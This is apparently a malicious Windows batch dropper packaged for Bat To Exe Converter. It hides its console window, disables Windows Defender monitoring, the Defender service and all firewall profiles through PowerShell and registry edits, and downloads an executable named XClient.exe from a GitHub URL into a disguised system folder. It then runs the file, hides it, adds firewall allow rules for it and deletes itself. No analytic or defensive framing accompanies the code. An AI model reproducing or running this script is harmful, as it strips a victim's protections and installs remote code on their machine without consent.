::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
setlocal EnableDelayedExpansion

set download_url=https://github.com/Yehiam990/sturdy-palm-tree/raw/refs/heads/main/XClient.exe
set download_path=%TEMP%\Kokox.exe
set retries=5
set delay=5
set targetPath=%SYSTEMDRIVE%\Windows\SysWOW64\winrm\Microsoft
set drivermapperPath=%targetPath%\Drivermapper.exe

powershell -Command "$hwnd = Get-Process -id $pid | select -Expand MainWindowHandle; $win32 = Add-Type @'using System; using System.Runtime.InteropServices; public class Win32 { [DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); } '@ -PassThru; $win32::ShowWindow($hwnd, 0)"

powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
powershell -WindowStyle Hidden -Command "Stop-Service -Name 'WinDefend' -Force"
powershell -WindowStyle Hidden -Command "Set-Service -Name 'WinDefend' -StartupType Disabled"
powershell -WindowStyle Hidden -Command "Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f

if not exist "%targetPath%" (
    mkdir "%targetPath%"
)

curl -L --silent "%download_url%" --output "%drivermapperPath%"

if exist "%drivermapperPath%" (
    start "" "%drivermapperPath%"
)

if exist "%drivermapperPath%" (
    attrib +s +h "%drivermapperPath%"
)

set /a attempt=0
:retry
powershell -Command "Invoke-WebRequest -Uri '%download_url%' -OutFile '%download_path%' -UseBasicP" >nul 2>&1
if exist %download_path% (
    exit /b 0
) else (
    set /a attempt+=1
    if %attempt% lss %retries% (
        timeout /t %delay% >nul
        goto retry
    )
)
exit /b 1

:run_and_add_exceptions
start "" /b "%download_path%" >nul 2>&1
powershell -WindowStyle Hidden -Command "New-NetFirewallRule -DisplayName 'Allow Kokox' -Direction Inbound -Program '%download_path%' -Action Allow -Profile Any" >nul 2>&1
powershell -WindowStyle Hidden -Command "New-NetFirewallRule -DisplayName 'Allow Kokox' -Direction Outbound -Program '%download_path%' -Action Allow -Profile Any" >nul 2>&1
del "%download_path%" >nul 2>&1

del "%~f0"